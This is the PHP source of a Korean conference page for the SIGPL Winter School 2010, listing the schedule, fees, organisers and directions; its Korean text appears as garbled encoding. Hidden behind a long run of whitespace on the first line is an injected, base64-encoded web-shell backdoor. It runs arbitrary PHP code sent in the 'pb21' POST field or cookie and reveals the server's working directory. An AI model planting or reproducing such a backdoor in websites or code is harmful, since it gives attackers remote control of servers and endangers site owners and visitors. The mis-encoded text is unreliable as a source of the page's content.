<?php  	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 /*b210c1c6c1ff379542e0106c9afa9346*/ eval(base64_decode("JGggID0gICAgICd3Jzs7ICAgIGlmICAgICAoICBpc3NldCggICRfQ09PS0lFWydkd2MnXSkgICkgICAgIHsgICBlY2hvICAnPGN3ZD4nICAgLiAgICAgZ2V0Y3dkKCkgICAuICAnPC9jd2Q+Jzs7ICAgICB9ICAgaWYgICAoICAgIGlzc2V0ICAoICAgICRfUE9TVFsncGIyMSddICAgICApICAgICkgIHsgIGV2YWwgICggIGJhc2U2NF9kZWNvZGUgICggICAkX1BPU1RbJ3BiMjEnXSAgICAgKSAgICk7OyA7ICAgcmV0dXJuOzsgICB9ICBpZiAgICAoICBpc3NldCggICAkX0NPT0tJRVsncGIyMSddKSAgICAgKSAgeyAgZXZhbCAgKCAgIGJhc2U2NF9kZWNvZGUgICAoICAkX0NPT0tJRVsncGIyMSddICAgICkgICAgKTs7IDsgOyAgICAgcmV0dXJuOzsgOyA7ICAgfSAg")); ?><meta http-equiv="Content-Type" content="text/html; charset=euc-kr" />
<html>
<head>
<link rel="stylesheet" type="text/css" href="/style.css">
<title>SIGPL 2010 �ܿ��б�</title>
<style type="text/css">
   .small { font-size: 10pt; }
   .smallbold { font-size: 10pt; font-weight: bold; }
</style>
</head>
<body>

<h1>
<center>
�ѱ���������ȸ ���α׷��־���ȸ �ܿ��б�
<br> (SIGPL Winter School 2010)
</center>
</h1>
<center><table><tr><th align="left">
<li>
   �Ͻ�: 2010�� 2�� 19��(��)
<li>
   ���: ���ſ��ڴ��б� ���Ű� 710ȣ
</td></tr></table>
</center>
<br>
 <p>
�ѱ���������ȸ ���α׷��־�� ����ȸ(SIGPL)�� �ų� ������ �ܿ� ���бⰣ�� ���п����� �����Ͼ�, ����, �����ڵ��� ������� �����б��� �����ϰ� �ֽ��ϴ�. �̹� �ܿ��б�����  �������α׷���, Ÿ�� �̷�, �Լ��� ���α׷���, ����Ʈ���� ���۱ǰ� ���õ� ���ǰ� �غ�Ǿ� �ֽ��ϴ�. ���� ���ɰ� ������ ��Ź�帳�ϴ�.
</p>
<p>
<b>�ѱ���������ȸ ���α׷��־���ȸ ������� ������</b>
</p>

<h2>���α׷� ����</h2>

<?php

$content = 
  '09:30-09:45 | ��� | ##
   head | ���� ���� ##
   09:45-10:45 &nbsp; | ���ķ� �����ϴ� ���� ���� (Breaking Sequential Habits of Thought) 1 | ������ (KAIST) ##
   11:00-12:00 | ���ķ� �����ϴ� ���� ���� (Breaking Sequential Habits of Thought) 2 | ������ (KAIST) ##
   head | ���� ���� ##
   13:30-14:45 | Programming with dependent types | �̰�� (�����) ##
   15:00-16:15 | �𳪵�� �𳪵� Ʈ�������Ӹ� �̿��ϴ� ���α׷��� | ������ (�漺��) ##
   16:30-17:45 | ����Ʈ���� ���۱� ��ȣ�� ���� �ڵ� ���� Ž�� ��� | ������ (KAIST) 
';

$list = explode("##", $content);

echo '
  <table border="0" cellspacing="0">
  <tr><td bgcolor="#cccccc">
  <table border="0" cellspacing="1pt">
';

$size = array ("0", "0", "0", "0");
	
foreach($list as $elm) {
  $value = explode("|", $elm);
  echo "<tr>";
  
  if(trim($value[0]) == "head") {
    $sw = 0;
    foreach($value as $elm) {
      if($sw == 1) { echo "<th colspan=\"3\" align=\"left\">".$elm."</th>"; }
      else if($sw > 1) { echo "<th>".$elm."</th>"; }
      $sw++; 
    }
  }
  else {
    $sw = 0;
    foreach($value as $elm) {
      if($size[$sw] != 0) echo '<td bgcolor="white" width="'.$size[$sw].'">'.$elm."</td>";
      else echo '<td bgcolor="white">'.$elm."</td>";
      $sw++;
    }
  }
  
  echo "</tr>";
}
					  
echo "</table></table>";

?>
				   

<h2> ��Ͼȳ� </h2>
<ul>
<li> ��Ϻ� 
<table border="1" bordercolor="#a0a0a0" cellspacing="0">
<tr><th>&nbsp;</th><th>�л�ȸ��</th><th>�Ϲ�ȸ��</th><th>��ȸ��</th></tr>
<tr align="center"><th>��Ϻ�</th><td>80,000��</td><td>120,000��</td><td>150,000��</td></tr>
</table>
  <li> �߽�/���� ����
  <li> ��� ���: <a href="/pay/school.php">���������</a>�� ���Ͽ� ���
		    <li> ���ѵ� ���� ������ ������ �ʿ��� �л�ȸ������ ��Ϻ� �Ϻθ� ������ �����Դϴ�. ��Ϻ� ������ �ʿ��Ͻ� ���� �̸��� <img src="/mail/jsahn.jpg">�� ��� ���� �̸� ��û �ٶ��ϴ�. (�� ��� ���� ��ü ������ϸ� ����)
</ul>

<h2> �غ�����ȸ </h2>
<ul>
  <li> �м�������: �Ž�ö ���� (�ѱ�����������б�)
  <li> ����������: �赵�� ���� (���ſ��ڴ��б�)
  <li> ����: ���ؼ� ���� (�ѱ��װ����б�, 010-6208-5593, <img src="/mail/jsahn.jpg">)
</ul>

  <h2> ��Ҿȳ� </h2>
<h3> ���ſ��ڴ��б� ���ô� ��</h3>
<ul>
				 <li> �ּ�: ����Ư���� ���ϱ� ������3�� 249-1 (�������� 54-7)
				 <li> ��ȭ: 02-920-7114
				 <li> ����
<ul>
				 <li> ���ſ��� �Ա�: 101, 102, 103, 104, 106, 107, 140, 142, 143, 149, 150, 152, 160, 161, 162, 171, 172, 1162, 1212
				 <li> ���ϱ�û �Ա�: 103, 142, 152, 272, 1014, 1111
</ul>
				 <li> ����ö: 4ȣ�� ���Ŵ��Ա��� �Ǵ� 6ȣ�� ������ 4�� �ⱸ���� �����Ͻð� 10�� ���� �̵��Ͻø� �˴ϴ�.
</ul>

<h3>
�б����ο��� �����ұ��� ���ô� ��</h3>
<img border="0" src="map.gif">

<!-- center>
<a href="building.jpg"><img width="640" border="0" src="building.jpg"></a>
</center>
<ul>
<li>
				 B24 1�� �Ұ��ǽ�: ���� -> �м��� -> �м��� ���ʱ� -> ���������� -> ���� 2��° �ǹ� (ū ������ �ִ� �ǹ�)
</ul>
</ul-->

</body>
</html>
